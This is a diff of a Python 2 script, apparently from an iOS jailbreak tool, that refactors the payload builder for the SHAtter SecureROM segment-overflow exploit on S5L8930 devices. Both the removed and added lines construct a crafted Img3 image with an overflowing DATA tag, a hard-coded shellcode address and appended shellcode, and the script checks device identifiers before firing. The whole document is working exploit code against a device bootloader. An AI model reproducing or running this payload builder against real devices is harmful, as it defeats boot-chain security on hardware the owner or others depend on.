@@ -1,24 +1,17 @@
 import struct, sys, time
 import dfu
 
-SRTG_STRING = 'SRTG:[iBoot-574.4]'
-CPID_STRING = 'CPID:8930'
-
 def generate_payload():
     shellcode_address = 0x8402F1D8
-    data = '\xF0' * 92 + struct.pack('<I', shellcode_address)
+    data = struct.pack('<4s2I92sI', 'DATA'[::-1], 12 + 96, 96, '\xF0' * 92, shellcode_address)
+    shsh = struct.pack('<4s2I',     'SHSH'[::-1], 12, 0)
+    cert = struct.pack('<4s2I',     'CERT'[::-1], 12, 0)
 
-    dataTag = struct.pack('<4s2I', 'DATA'[::-1], 12 + len(data), len(data)) + data
-    shshTag = struct.pack('<4s2I', 'SHSH'[::-1], 12, 0)
-    certTag = struct.pack('<4s2I', 'CERT'[::-1], 12, 0)
-
-    img3Payload = dataTag + shshTag + certTag
-    img3Header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(img3Payload), len(img3Payload), len(dataTag), 'ibss'[::-1])
-
-    f = open('bin/SHAtter-shellcode.bin', 'rb')
-    shellcode = f.read()
-    f.close()
-    return img3Header + img3Payload + shellcode
+    with open('bin/SHAtter-shellcode.bin', 'rb') as f:
+        shellcode = f.read()
+    tags = data + shsh + cert
+    header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(tags), len(tags), len(data), 'ibss'[::-1])
+    return header + tags + shellcode
 
 def exploit():
     print '*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***'
@@ -30,11 +23,11 @@ def exploit():
         print 'Device is already in pwned DFU Mode. Not executing exploit.'
         return
 
-    if CPID_STRING not in device.serial_number:
+    if 'CPID:8930' not in device.serial_number:
         print 'ERROR: Not a compatible device. This exploit is for S5L8930 devices only. Exiting.'
         sys.exit(1)
 
-    if SRTG_STRING not in device.serial_number:
+    if 'SRTG:[iBoot-574.4]' not in device.serial_number:
         print 'ERROR: CPID is compatible, but serial number string does not match.'
         print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
         sys.exit(1)
